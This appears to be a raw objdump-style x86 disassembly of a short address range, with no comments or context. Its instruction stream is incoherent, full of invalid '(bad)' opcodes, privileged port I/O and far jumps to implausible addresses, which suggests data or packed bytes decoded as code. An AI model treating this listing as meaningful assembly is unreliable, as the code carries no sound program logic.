  4115ac:	sub    DWORD PTR [edx+0x945c496],0x67
  4115b3:	cmp    BYTE PTR [edx-0x47],dh
  4115b6:	add    eax,0x740a3de1
  4115bb:	or     ah,BYTE PTR [edx-0x3764ccef]
  4115c1:	retf   0xa5b6
  4115c4:	mov    cl,0x5f
  4115c6:	repz aaa 
  4115c8:	inc    esp
  4115c9:	push   esi
  4115ca:	pop    esp
  4115cb:	test   al,0xfc
  4115cd:	loop   0x4115b9
  4115cf:	ins    BYTE PTR es:[edi],dx
  4115d0:	mov    ah,0xab
  4115d2:	mov    WORD PTR [ebx+ebx*1+0x3ddada7b],ds
  4115d9:	fwait
  4115da:	aam    0x80
  4115dc:	mov    eax,0x9928e6ec
  4115e1:	jl     0x4115c4
  4115e3:	push   es
  4115e4:	retf   0x6fa6
  4115e7:	push   es
  4115e8:	xchg   ebp,eax
  4115e9:	shl    al,cl
  4115eb:	mov    ecx,DWORD PTR [ebp+0x4]
  4115ee:	sub    DWORD PTR [edx],0xffffffb5
  4115f1:	push   DWORD PTR [ebx-0x3032025a]
  4115f7:	sub    eax,0x9b33d739
  4115fc:	jns    0x41167d
  4115fe:	pushf  
  4115ff:	mov    eax,ds:0x6b9329ed
  411604:	jne    0x411655
  411606:	(bad)  
  411607:	cmp    ecx,DWORD PTR [eax-0x4e8beffe]
  41160d:	dec    DWORD PTR [edx+ebx*8]
  411610:	loop   0x411593
  411612:	jecxz  0x41163c
  411614:	inc    edx
  411615:	mov    esp,0xe4358d3c
  41161a:	xlat   BYTE PTR ds:[ebx]
  41161b:	mov    eax,ds:0x35fba01f
  411620:	pop    esp
  411621:	mov    BYTE PTR [edx-0x80],ah
  411624:	pushf  
  411625:	lea    esp,[ebp+edx*2-0x64]
  411629:	jnp    0x411659
  41162b:	ror    esi,0x99
  41162e:	jmp    0x7f941492
  411633:	into   
  411634:	arpl   WORD PTR [ecx],bp
  411636:	jg     0x41164f
  411638:	xchg   esp,eax
  411639:	je     0x411670
  41163b:	mov    eax,0x5edf5d19
  411640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411641:	push   cs
  411642:	mov    dh,0x64
  411644:	stos   DWORD PTR es:[edi],eax
  411645:	mov    BYTE PTR [esi-0x70b3854c],bl
  41164b:	jns    0x411672
  41164d:	sbb    eax,0xbba7a17f
  411652:	retf   
  411653:	pushf  
  411654:	lods   al,BYTE PTR ds:[esi]
  411655:	jle    0x411669
  411657:	out    0x80,al
  411659:	mov    cl,0xa
  41165b:	mov    ah,0xcd
  41165d:	xor    edi,esp
  41165f:	jg     0x4116b9
  411661:	test   BYTE PTR [edi+ebp*8],0xb5
  411665:	inc    ebp
  411666:	test   al,0xf8
  411668:	ds jb  0x4116a8
  41166b:	and    BYTE PTR [esi-0x77],al
  41166e:	fcom   QWORD PTR [ebx+esi*2+0x402c0fab]
  411675:	test   DWORD PTR [esi],0xb9b2d3b0
  41167b:	and    al,0xdf
  41167d:	mov    ds:0x172cc4fa,al
  411682:	push   es
  411683:	fs mov ecx,0x1965c288
  411689:	xlat   BYTE PTR ds:[ebx]
  41168a:	(bad)  
  41168b:	and    edx,DWORD PTR [edi]
  41168d:	sbb    ebx,DWORD PTR [edi]
  41168f:	fst    QWORD PTR [esi+0x3d]
  411692:	adc    al,0xe8
  411694:	call   0xa15e:0xa6650ead
  41169b:	arpl   WORD PTR [ecx-0x310c325c],cx
  4116a1:	push   esi
  4116a2:	mov    ebx,0x1cb1ace6
  4116a7:	arpl   WORD PTR [ecx-0x4693d424],ax
  4116ad:	dec    esp
  4116ae:	dec    edx
  4116af:	ins    BYTE PTR es:[edi],dx
  4116b0:	adc    al,0x74
  4116b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4116b3:	xchg   edi,eax
  4116b4:	cmp    DWORD PTR [edi-0xb88d42d],esi
  4116ba:	jmp    0xd036d5a1
  4116bf:	fucomi st,st(3)
  4116c1:	mov    al,ds:0x78638de1
  4116c6:	cmp    BYTE PTR [esi],0xc8
  4116c9:	outs   dx,BYTE PTR ds:[esi]
  4116ca:	add    esp,0xf17770cc
  4116d0:	hlt    
  4116d1:	mov    ch,0xc1
  4116d3:	xchg   BYTE PTR [eax],cl
  4116d5:	stc    
  4116d6:	scas   ax,WORD PTR es:[edi]
  4116d8:	in     eax,0xe9
  4116da:	dec    edi
  4116db:	mov    ds:0x4be937bd,eax
  4116e0:	imul   eax,DWORD PTR [esi+0xe],0x7d
  4116e4:	clc    
  4116e5:	test   DWORD PTR [edx],0xae0bc8b6
  4116eb:	loope  0x4116cc
  4116ed:	dec    ebx
  4116ee:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4116ef:	jne    0x4116f9
  4116f1:	pusha  
  4116f2:	mov    ds:0x9e8893bd,al
  4116f7:	mov    ebp,0xfb8a715a
  4116fc:	xor    eax,0xc5502cbc
  411701:	rcr    BYTE PTR [ebx+0x26],0xf3
  411705:	pop    es
  411706:	inc    esp
  411707:	dec    eax
  411708:	adc    al,0x4b
  41170a:	popf   
  41170b:	cli    
  41170c:	lock arpl WORD PTR [esi],di
  41170f:	mov    eax,ds:0x917e509
  411714:	fld    QWORD PTR [eax+0x25]
  411717:	add    eax,0x8ea1c6f5
  41171c:	pop    edx
  41171d:	jle    0x4116e3
  41171f:	push   0x11
  411721:	loope  0x41171b
  411723:	push   ss
  411724:	aaa    
  411725:	jne    0x4116db
  411727:	adc    eax,0x44724c26
  41172c:	or     eax,0x596010df
  411731:	loope  0x4116c7
  411733:	ja     0x41179b
  411735:	add    al,0x9f
  411737:	clc    
  411738:	int3   
  411739:	loop   0x411752
  41173b:	ins    DWORD PTR es:[edi],dx
  41173c:	and    BYTE PTR [ebp-0xb],bh
  41173f:	int3   
  411740:	in     al,0xc6
  411742:	xor    ebp,0x46
  411745:	imul   eax,DWORD PTR [ecx-0x40],0x7e9b2d1f
  41174c:	or     ch,BYTE PTR [edi+ecx*4+0x6e0f1198]
  411753:	xor    eax,0x8d331528
  411758:	ds mov bh,0x48
  41175b:	mov    edx,0x713b62da
  411760:	jg     0x411797
  411762:	cmp    ebx,ebp
  411764:	test   ah,dl
  411766:	sub    ebx,edi
  411768:	test   al,0x64
  41176a:	xchg   esp,eax
  41176b:	jno    0x41175f
  41176d:	fsubr  st,st(6)
  41176f:	jmp    0x4117af
  411771:	cmp    eax,DWORD PTR [edx]
  411773:	or     bh,BYTE PTR es:[ebx]
  411776:	fcom   st(5)
  411778:	mov    BYTE PTR [eax],dl
  41177a:	les    edi,FWORD PTR [ebx]
  41177c:	push   ebx
  41177d:	pop    es
  41177e:	in     al,dx
  41177f:	fsub   DWORD PTR [esi+0x1d]
  411782:	test   al,0x2d
  411784:	inc    ebp
  411785:	pop    ebx
  411786:	int3   
  411787:	aad    0x2b
  411789:	in     eax,dx
  41178a:	sub    esp,DWORD PTR [eax]
  41178c:	mov    si,0x86a8
  411790:	adc    BYTE PTR [esi-0x1d97a870],bl
  411796:	pop    ebp
  411797:	cmp    BYTE PTR [ebx],bl
  411799:	imul   eax,DWORD PTR [esi],0xffffffae
  41179c:	or     bl,BYTE PTR [ecx+0xc]
  41179f:	mov    ah,0xc2
  4117a1:	pushf  
  4117a2:	jp     0x411807
  4117a4:	add    al,0xdb
  4117a6:	daa    
  4117a7:	pop    esi
  4117a8:	add    ch,BYTE PTR [ebx]
  4117aa:	shr    ecx,cl
  4117ac:	mov    dl,0x51
  4117ae:	fsubr  DWORD PTR [edx]
  4117b0:	adc    BYTE PTR [edx-0x20],ch
  4117b3:	dec    ecx
  4117b4:	pop    ebp
  4117b5:	mov    edx,0xb8aacccf
  4117ba:	and    BYTE PTR [ebx-0x1f],bl
  4117bd:	push   0x76
  4117bf:	pusha  
  4117c0:	scas   al,BYTE PTR es:[edi]
  4117c1:	xchg   esp,eax
  4117c2:	es ret 
  4117c4:	cmp    al,0x86
  4117c6:	sbb    edi,edx
  4117c8:	test   al,0x24
  4117ca:	xchg   esi,eax
  4117cb:	add    al,0x57
  4117cd:	and    eax,0xc9055ec6
  4117d2:	sahf   
  4117d3:	sbb    esi,DWORD PTR [eax+0x6500c347]
  4117d9:	push   ebx
  4117da:	add    esp,DWORD PTR [edi+0x1a830dfa]
  4117e0:	push   0xe
  4117e2:	push   eax
  4117e3:	or     bl,bh
  4117e5:	not    BYTE PTR [esi-0x6b147f4d]
  4117eb:	ds mov dh,0x77
  4117ee:	mov    ch,0x3d
  4117f0:	fwait
  4117f1:	jo     0x411773
  4117f3:	ud0    ecx,DWORD PTR [edi]
  4117f6:	jb     0x411814
  4117f8:	push   0x5f
  4117fa:	sbb    eax,0x1de182ba
  4117ff:	jae    0x411852
  411801:	hlt    
  411802:	jle    0x411870
  411804:	mov    eax,0x4aa3e33a
  411809:	je     0x411822
  41180b:	in     eax,dx
  41180c:	aad    0xe9
  41180e:	xchg   ebp,eax
  41180f:	aas    
  411810:	push   ss
  411811:	(bad)  
  411812:	and    DWORD PTR ds:0xdc3dbfcf,ebx
  411818:	scas   eax,DWORD PTR es:[edi]
  411819:	aad    0xa8
  41181b:	hlt    
  41181c:	cdq    
  41181d:	shl    BYTE PTR [eax-0x1407e077],0x2b
  411824:	adc    BYTE PTR [esi],ch
  411826:	aaa    
  411827:	and    BYTE PTR [eax],al
  411829:	xor    eax,0xc2272ebc
  41182e:	xchg   ebp,eax
  41182f:	(bad)  
  411830:	jo     0x411859
  411832:	pop    edx
  411833:	mov    edx,0xbd64cc63
  411838:	mov    edi,0xee638893
  41183d:	jo     0x41187b
  41183f:	cmp    edx,DWORD PTR [esi-0x4c1b5b01]
  411845:	cmp    BYTE PTR ss:[edi],cl
  411848:	mov    ah,0x9e
  41184a:	(bad)  
  41184b:	sbb    BYTE PTR ss:[edx],cl
  41184e:	sub    al,0xd7
  411850:	mov    ds:0x68ddfb33,al
  411855:	pop    ebx
  411856:	xchg   ecx,eax
  411857:	or     bh,BYTE PTR [esi-0x76]
  41185a:	xor    DWORD PTR ss:[edx],eax
  41185d:	bound  ebp,QWORD PTR [ecx]
  41185f:	sub    BYTE PTR [eax+ebx*8],cl
  411862:	xor    cl,cl
  411864:	sbb    eax,0x51f1dc8b
  411869:	stos   DWORD PTR es:[edi],eax
  41186a:	xchg   esp,eax
  41186b:	cmc    
  41186c:	retf   0x4ff1
  41186f:	shl    BYTE PTR [ecx+0x77],1
  411872:	xchg   ebx,eax
  411873:	push   ds
  411874:	cmc    
  411875:	les    edx,FWORD PTR [edx-0x18]
  411878:	jnp    0x4118b7
  41187a:	dec    esi
  41187b:	push   ecx
  41187c:	mov    ds:0xcb10eed4,eax
  411881:	movlps QWORD PTR [ebx-0x34b00839],xmm2
  411888:	mov    bh,0x6f
  41188a:	sub    eax,0xd99e9bac
  41188f:	sbb    BYTE PTR [ecx-0x27ee9a88],bl
  411895:	jmp    0x996d:0xc54c9ab6
  41189c:	xchg   ecx,eax
  41189d:	dec    edi
  41189e:	sub    DWORD PTR [ebx+ebx*8+0x50c1fa5d],esp
  4118a5:	mul    BYTE PTR [ebx+edx*2-0x6e]
  4118a9:	or     ebx,DWORD PTR [edi]
  4118ab:	dec    ecx
  4118ac:	xor    BYTE PTR [edx+0x35a0220d],dh
  4118b2:	(bad)  [edx-0x1c]
  4118b5:	pop    ss
  4118b6:	mov    dl,0x46
  4118b8:	repnz mov BYTE PTR [edx+0x5be26f8],bh
  4118bf:	dec    esi
  4118c0:	push   ecx
  4118c1:	icebp  
  4118c2:	adc    BYTE PTR [eax-0x7f],bl
  4118c5:	dec    ebx
  4118c6:	scas   eax,DWORD PTR es:[edi]
  4118c7:	xor    BYTE PTR [ecx+esi*1-0x4095ce69],bh
  4118ce:	or     eax,DWORD PTR [ecx]
  4118d0:	or     al,0x91
  4118d2:	xchg   edi,eax
  4118d3:	shrd   DWORD PTR [ebx+0x2d],edi,0x11
  4118d8:	ficomp WORD PTR [esi+0x5]
  4118db:	jmp    FWORD PTR [edx]
  4118dd:	inc    esp
  4118de:	icebp  
  4118df:	sbb    al,0xba
  4118e1:	push   ebx
  4118e2:	ret    
  4118e3:	ins    BYTE PTR es:[edi],dx
  4118e4:	shl    DWORD PTR [ebp+0x1f],0x20
  4118e8:	shl    BYTE PTR [ebp+0x1a],cl
  4118eb:	shr    BYTE PTR ds:0x807e29b4,cl
  4118f1:	cmp    BYTE PTR [esi+0x280dd100],0x30
  4118f8:	in     al,0xd1
  4118fa:	push   cs
  4118fb:	xor    edi,DWORD PTR [esi-0x2f9d0df4]
  411901:	push   edi
  411902:	pop    esi
  411903:	loop   0x411977
  411905:	lahf   
  411906:	cdq    
  411907:	pop    edi
  411908:	sub    esi,eax
  41190a:	popa   
  41190b:	sub    edi,edi
  41190d:	scas   al,BYTE PTR es:[edi]
  41190e:	xchg   ecx,eax
  41190f:	jmp    0x411939
  411911:	push   edx
  411912:	loope  0x4118fe
  411914:	ret    
  411915:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411916:	loopne 0x411960
  411918:	cli    
  411919:	sar    edi,0x16
  41191c:	ret    0x71da
  41191f:	pop    edx
  411920:	std    
  411921:	and    al,0x1b
  411923:	dec    ecx
  411924:	cmp    al,0xb3
  411926:	test   al,0x50
  411928:	call   0xcea15b5
  41192d:	fsubr  QWORD PTR [edx]
  41192f:	add    al,0x89
  411931:	inc    edx
  411932:	lahf   
  411933:	xchg   edx,eax
  411934:	jo     0x411915
  411936:	xor    bh,BYTE PTR [edi]
  411938:	inc    edx
  411939:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41193a:	sub    dh,bl
  41193c:	or     al,0x9c
  41193e:	fisub  WORD PTR [edi+0x590470df]
  411944:	add    al,0x9f
  411946:	push   0x40
  411948:	mov    ecx,ecx
  41194a:	ror    BYTE PTR [ecx-0x3eca6ea1],0x7a
  411951:	push   0x5a62f5fb
  411956:	(bad)  
  411957:	repz jo 0x4119b0
  41195a:	mov    edi,0xa58fe929
  41195f:	out    0x15,eax
  411961:	xor    eax,0x3af4188
  411966:	int    0xa0
  411968:	ss stos BYTE PTR es:[edi],al
  41196a:	xor    BYTE PTR [edx+eax*2+0x10f03f40],ah
  411971:	pushf  
  411972:	pop    ss
  411973:	retf   0x1162
  411976:	loop   0x4119c2
  411978:	retf   0xf275
  41197b:	aad    0xb0
  41197d:	xchg   ecx,eax
  41197e:	jo     0x41193c
  411980:	clc    
  411981:	push   ebx
  411982:	popa   
  411983:	fadd   st,st(4)
  411985:	push   ebx
  411986:	xchg   esp,eax
  411987:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411988:	mov    ds:0x9345efaf,eax
  41198d:	jmp    0x70cb71d3
  411992:	dec    ebp
  411993:	cmp    al,0xca
  411995:	arpl   si,di
  411997:	inc    eax
  411998:	mov    eax,0x6468d14e
  41199d:	inc    edi
  41199e:	out    0xfc,al
  4119a0:	adc    ch,BYTE PTR [ebp+0x60]
  4119a3:	mov    bl,0xa3
  4119a5:	adc    al,0x11
  4119a7:	pop    ebx
  4119a8:	imul   ebp,DWORD PTR [ebx+0x64c556e],0x4c
  4119af:	aaa    
  4119b0:	(bad)  
  4119b1:	mov    dh,0x2c
  4119b3:	fsubrp st(6),st
  4119b5:	jo     0x4119f8
  4119b7:	out    0x41,al
  4119b9:	jno    0x4119d2
  4119bb:	mov    eax,ds:0xf92b03f2
  4119c0:	loope  0x41195f
  4119c2:	int3   
  4119c3:	jmp    0xf417:0x963d1c39
  4119ca:	mov    ebp,0x6a9da434
  4119cf:	int3   
  4119d0:	sbb    ebp,eax
  4119d2:	(bad)  
  4119d3:	std    
  4119d4:	or     esp,DWORD PTR [edi+0x690f1b55]
  4119da:	outs   dx,BYTE PTR ds:[esi]
  4119db:	pop    ecx
  4119dc:	out    0xf4,eax
  4119de:	push   edx
  4119df:	out    dx,al
  4119e0:	jo     0x4119ed
  4119e2:	pop    ebp
  4119e3:	addr16 mov al,0x5c
  4119e6:	push   0xffffffd2
  4119e8:	dec    edx
  4119e9:	(bad)
  4119ed:	neg    DWORD PTR [edx+eiz*4]
  4119f0:	scas   al,BYTE PTR es:[edi]
  4119f1:	stc    
  4119f2:	cmp    ah,BYTE PTR [eax-0x71]
  4119f5:	(bad)  
  4119f6:	sti    
  4119f7:	aaa    
  4119f8:	xchg   BYTE PTR [ebp-0x1e],ah
  4119fb:	jo     0x4119ad
  4119fd:	into   
  4119fe:	loop   0x411a3f
  411a00:	jno    0x4119ba
  411a02:	sbb    bh,BYTE PTR [edi-0x6696c658]
  411a08:	jp     0x411a43
  411a0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411a0b:	mov    ecx,0xe2bd041c
  411a10:	mov    ah,0xb5
  411a12:	mov    esp,0x72fd2f0b
  411a17:	call   0xe01bd1e9
  411a1c:	jecxz  0x4119b5
  411a1e:	pushw  ds
  411a20:	addr16 jbe 0x411a71
  411a23:	imul   edi,DWORD PTR [ebx],0xc11840d9
  411a29:	std    
  411a2a:	and    DWORD PTR [ebx-0x4fe40e3a],eax
  411a30:	retf   0xcd00
  411a33:	popa   
  411a34:	(bad)  
  411a35:	hlt    
  411a36:	outs   dx,DWORD PTR ds:[esi]
  411a37:	pop    esp
  411a38:	out    dx,al
  411a39:	mov    ds:0x2546dfa7,eax
  411a3e:	out    dx,al
  411a3f:	jo     0x411a92
  411a41:	pop    edx
  411a42:	jbe    0x411ac1
  411a44:	ins    BYTE PTR es:[edi],dx
  411a45:	adc    al,0xac
  411a47:	or     eax,0x9a3ed6c9
  411a4c:	rcl    DWORD PTR [eax-0x4f],0x3a
  411a50:	xchg   esp,eax
  411a51:	cmp    BYTE PTR [edx-0x16],al
  411a54:	clc    
  411a55:	retf   0xccd6
  411a58:	jge    0x411a69
  411a5a:	and    DWORD PTR [ebx-0x10],0x5f899cae
  411a61:	ja     0x4119fc
  411a63:	dec    edx
  411a64:	and    DWORD PTR ds:0x84bacae5,edx
  411a6a:	add    BYTE PTR [eax+eiz*8],dl
  411a6d:	out    dx,al
  411a6e:	imul   edi,DWORD PTR [edx+0x7584f40e],0x72
  411a75:	stos   BYTE PTR es:[edi],al
  411a76:	sub    ch,al
  411a78:	mov    bh,0x47
  411a7a:	repnz leave 
  411a7c:	mov    al,ds:0x6ed1e401
  411a81:	mov    esp,0xbf237178
  411a86:	xchg   esi,eax
  411a87:	mov    ds:0x447075a8,al
  411a8c:	sar    DWORD PTR [ecx+0x10],0x25
  411a90:	cmp    eax,ecx
  411a92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a93:	clc    
  411a94:	loope  0x411a5d
  411a96:	mov    edi,0x69dbd6a5
  411a9b:	mov    bl,BYTE PTR [edi+0xa55069d]
  411aa1:	ds test eax,0x426f9950
  411aa7:	adc    DWORD PTR [ebx-0x654d57ad],0x34
  411aae:	and    ecx,DWORD PTR [edx+0xb]
  411ab1:	mov    edx,0x7c800f50
  411ab6:	repz clc 
  411ab8:	xor    bh,BYTE PTR [edx]
  411aba:	aad    0x26
  411abc:	jmp    0x1dc9:0xffbe2c10
  411ac3:	(bad)  
  411ac4:	cmp    eax,DWORD PTR [eax]
  411ac6:	cmp    eax,0xa7bd68de
  411acb:	pop    esi
  411acc:	rol    dh,1
  411ace:	or     BYTE PTR [edi],cl
  411ad0:	cmp    eax,ebx
  411ad2:	(bad)  
  411ad3:	sbb    BYTE PTR [eax+0xa],cl
  411ad6:	xchg   edx,eax
  411ad7:	ins    BYTE PTR es:[edi],dx
  411ad8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ad9:	jbe    0x411adc
  411adb:	adc    cl,BYTE PTR [edx-0x17]
  411ade:	popa   
  411adf:	mov    bh,0x98
  411ae1:	cmp    edx,DWORD PTR [edx+0x5f25af15]
  411ae7:	retf   
  411ae8:	(bad)  
  411ae9:	sub    al,0x5c
  411aeb:	fistp  WORD PTR [ebp+ebp*2-0x58a67f0b]
  411af2:	mov    cl,0xa9
  411af4:	cmp    eax,0x1093fdfc
  411af9:	push   ebp
  411afa:	jne    0x411b24
  411afc:	lds    edi,FWORD PTR [ebp+0x1d256115]
  411b02:	sbb    al,0x2f
  411b04:	sub    esp,DWORD PTR [edi-0x4b]
  411b07:	and    eax,0xb0ed697f
  411b0c:	dec    edx
  411b0d:	dec    eax
  411b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b0f:	rcr    DWORD PTR [edx],1
  411b11:	arpl   WORD PTR [ecx],bx
  411b13:	xor    al,ah
  411b15:	mov    ds:0x568dde6b,al
  411b1a:	cmp    ah,BYTE PTR [esi+0x38]
  411b1d:	jae    0x411b9e
  411b1f:	imul   edi,edi,0x7ec0f5ba
  411b25:	out    dx,al
  411b26:	fiadd  DWORD PTR [edx]
  411b28:	mov    eax,ds:0x768634f0
  411b2d:	test   al,0x11
  411b2f:	cmp    BYTE PTR [edi+eiz*1],bl
  411b32:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b34:	pop    esp
  411b35:	ins    DWORD PTR es:[edi],dx
  411b36:	push   es
  411b37:	in     eax,dx
  411b38:	mov    ebx,0x7d54a83c
  411b3d:	mov    edx,0x3812437
  411b42:	cld    
  411b43:	in     eax,0xca
  411b45:	and    eax,0x822ddac
  411b4a:	loopne 0x411b52
  411b4c:	das    
  411b4d:	cli    
  411b4e:	pop    esi
  411b4f:	add    DWORD PTR [ebx+esi*8],ebp
  411b52:	and    al,0x9
  411b54:	pop    ss
  411b55:	sub    al,0x87
  411b57:	retf   0x7fd2
  411b5a:	test   al,0x30
  411b5c:	js     0x411ba0
  411b5e:	iret   
  411b5f:	ret    0xba2c
  411b62:	push   ss
  411b63:	add    DWORD PTR [ecx+0x2c1c63a3],esp
  411b69:	jns    0x411b97
  411b6b:	dec    esp
  411b6c:	sub    ah,bl
  411b6e:	cwde   
  411b6f:	in     eax,dx
  411b70:	jmp    0x23349c69
  411b75:	std    
  411b76:	xor    BYTE PTR [esp+ecx*8-0x2c25c4eb],0x20
  411b7e:	aam    0x7f
  411b80:	cli    
  411b81:	push   eax
  411b82:	push   eax
  411b83:	in     eax,0xcb
  411b85:	cli    
  411b86:	jge    0x411b95
  411b88:	fidivr DWORD PTR [edi-0xf]
  411b8b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b8c:	or     eax,0x8dd47a92
  411b91:	push   0xe810f99d
  411b96:	xor    cl,ch
  411b98:	adc    al,0x8
  411b9a:	push   esi
  411b9b:	shl    BYTE PTR [ebp+0x26],0x13
  411b9f:	jecxz  0x411b21
  411ba1:	int3   
  411ba2:	enter  0xf019,0x4f
  411ba6:	add    al,0x57
  411ba8:	inc    esi
  411ba9:	mov    cl,0x2b
  411bab:	and    al,0x20
  411bad:	mov    ah,0x9a
  411baf:	jecxz  0x411bd4
  411bb1:	cwde   
  411bb2:	addr16 (bad) 
  411bb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411bb5:	rcr    esp,cl
  411bb7:	mov    ch,cl
  411bb9:	popf   
  411bba:	scas   eax,DWORD PTR es:[edi]
  411bbb:	adc    eax,0xfba4630f
  411bc0:	mov    al,ds:0xac9b0a0a
  411bc5:	xor    ch,ch
  411bc7:	xchg   ecx,eax
  411bc8:	push   esi
  411bc9:	dec    esp
  411bca:	and    al,0xcf
  411bcc:	push   ss
  411bcd:	pop    edx
  411bce:	nop
  411bcf:	ja     0x411bb3
  411bd1:	mov    eax,0x1c301c26
  411bd6:	daa    
  411bd7:	or     ch,0x51
  411bda:	push   esp
  411bdb:	push   ds
  411bdc:	push   ss
  411bdd:	pop    edx
  411bde:	xor    al,0x34
  411be0:	sub    ah,ah
  411be2:	sbb    bl,cl
  411be4:	loop   0x411b97
  411be6:	jbe    0x411c2d
  411be8:	(bad)  
  411be9:	cld    
  411bea:	data16 jae 0x411c55
  411bed:	mov    esi,0xbd314912
  411bf2:	cmp    BYTE PTR [edx+0x7d],dh
  411bf5:	inc    ebp
  411bf6:	inc    esp
  411bf7:	mov    ch,0xfc
  411bf9:	imul   esi,DWORD PTR [eax+0x5b],0x2f
  411bfd:	sbb    cl,bh
  411bff:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411c00:	mov    ebp,0x976451c4
  411c05:	pushf  
  411c06:	ja     0x411c27
  411c08:	(bad)  
  411c09:	jmp    0x1a22ab2b
  411c0e:	and    bl,BYTE PTR [ecx]
  411c10:	xor    al,0xdf
  411c12:	mov    cl,0x59
  411c14:	call   0xbff48607
  411c19:	xor    eax,0x5b4d1bb1
  411c1e:	xor    eax,0x14c433b
  411c23:	jg     0x411ca1
  411c25:	add    eax,0x2138c9f1
  411c2a:	lods   al,BYTE PTR ds:[esi]
  411c2b:	jle    0x411c17
  411c2d:	aaa    
  411c2e:	stc    
  411c2f:	sub    ecx,ebp
  411c31:	add    eax,0x8636a7ae
  411c36:	daa    
  411c37:	int    0x1f
  411c39:	sbb    al,0xd9
  411c3b:	(bad)  
  411c3c:	jns    0x411c88
  411c3e:	fcom   QWORD PTR [ebx+0x629f6d20]
  411c44:	cmp    cl,bh
  411c46:	pop    es
  411c47:	stos   BYTE PTR es:[edi],al
  411c48:	frstor [esi+0x72]
  411c4b:	mov    eax,0x88ce8c98
  411c50:	retf   
  411c51:	icebp  
  411c52:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411c53:	or     ecx,DWORD PTR [ebx+0x7c924b75]
  411c59:	push   cs
  411c5a:	aas    
  411c5b:	mov    bh,0x50
  411c5d:	sahf   
  411c5e:	and    BYTE PTR [ebx-0x4674714e],bh
  411c64:	inc    edi
  411c65:	sub    al,0x56
  411c67:	lods   eax,DWORD PTR ds:[esi]
  411c68:	stos   BYTE PTR es:[edi],al
  411c69:	xor    ah,cl
  411c6b:	adc    al,BYTE PTR [edi]
  411c6d:	jmp    0x5b2b2b3f
  411c72:	lahf   
  411c73:	sahf   
  411c74:	lock js 0x411c2a
  411c77:	or     DWORD PTR [ebp-0x13ae6960],edi
  411c7d:	shl    BYTE PTR [edx+0x6cb29ca1],0x90
  411c84:	pop    esp
  411c85:	imul   eax,DWORD PTR [ecx+0x17],0xd2fe6015
  411c8c:	cmp    eax,0xbd7616d2
  411c91:	ins    BYTE PTR es:[edi],dx
  411c92:	sbb    ebp,DWORD PTR [ebx-0x3c]
  411c95:	xlat   BYTE PTR ds:[ebx]
  411c96:	cmc    
  411c97:	int    0x61
  411c99:	mov    ah,0x19
  411c9b:	rcr    edx,0x92
  411c9e:	adc    BYTE PTR [eax],al
  411ca0:	push   ebp
  411ca1:	shl    ebx,1
  411ca3:	test   al,0xb2
  411ca5:	fdiv   DWORD PTR [ebp+eax*8-0x6f]
  411ca9:	clc    
  411caa:	(bad)  
  411cab:	mov    ebx,0x23f25f91
  411cb0:	cmp    ecx,DWORD PTR [eax+0x6]
  411cb3:	add    BYTE PTR [ebx+0x16a7d8af],dh
  411cb9:	mov    eax,0xa16f0b67
  411cbe:	ficom  DWORD PTR es:[edx+ebp*4]
  411cc2:	outs   dx,BYTE PTR ds:[esi]
  411cc3:	sub    al,0x52
  411cc5:	mov    DWORD PTR [edx],eax
  411cc7:	nop
  411cc8:	jbe    0x411cf5
  411cca:	pop    es
  411ccb:	cmp    esp,ecx
  411ccd:	adc    ah,BYTE PTR [ebx+0x5b]
  411cd0:	je     0x411cfc
  411cd2:	stos   BYTE PTR es:[edi],al
  411cd3:	add    cl,BYTE PTR [eax+0x1e]
  411cd6:	pop    esi
  411cd7:	add    ecx,DWORD PTR [esi-0x3f52751]
  411cdd:	jno    0x411c62
  411cdf:	adc    BYTE PTR [edx-0x14785f3c],dh
  411ce5:	xor    al,BYTE PTR [esi]
  411ce7:	pushf  
  411ce8:	xchg   edi,eax
  411ce9:	dec    edx
  411cea:	mov    edx,0xc4c584c7
  411cef:	push   ebx
  411cf0:	and    al,0x71
  411cf2:	mov    eax,ds:0x4d354965
  411cf7:	out    dx,al
  411cf8:	push   eax
  411cf9:	cmp    bl,BYTE PTR [edx-0x1567fbce]
  411cff:	int    0x2c
  411d01:	jno    0x411cf5
  411d03:	retf   
  411d04:	jp     0x411d5b
  411d06:	xchg   BYTE PTR [ebx+esi*8-0xa53ea93],cl
  411d0d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d0e:	jae    0x411d44
  411d10:	jae    0x411d32
  411d12:	fstp   DWORD PTR [ecx+eiz*8+0x43fae74a]
  411d19:	shr    DWORD PTR [eax+ebp*2],1
  411d1c:	gs (bad) 
  411d1e:	fsub   DWORD PTR [ebp-0xc]
  411d21:	popf   
  411d22:	fisubr DWORD PTR [edi-0x7948c5cf]
  411d28:	stc    
  411d29:	sbb    BYTE PTR [esp+edx*2+0x71974b21],dl
  411d30:	cdq    
  411d31:	mov    ds,edx
  411d33:	ret    0x85e7
  411d36:	stos   DWORD PTR es:[edi],eax
  411d37:	adc    eax,0xf355ed7b
  411d3c:	mov    DWORD PTR [esi],esi
  411d3e:	adc    al,0x89
  411d40:	into   
  411d41:	mov    bh,0x1f
  411d43:	mov    edx,0x367b685d
  411d48:	push   eax
  411d49:	shl    bl,cl
  411d4b:	xor    eax,0x67fb078d
  411d50:	lahf   
  411d51:	dec    edi
  411d52:	call   0x5db8:0x5631e899
  411d59:	jg     0x411da9
  411d5b:	aas    
  411d5c:	pop    ds
  411d5d:	imul   edi,DWORD PTR [edi],0xe02a17b1
  411d63:	xchg   ecx,eax
  411d64:	mul    DWORD PTR [ebp+ebp*2-0x75bf9373]
  411d6b:	test   BYTE PTR [ecx],cl
  411d6d:	sbb    al,0xaa
  411d6f:	inc    ecx
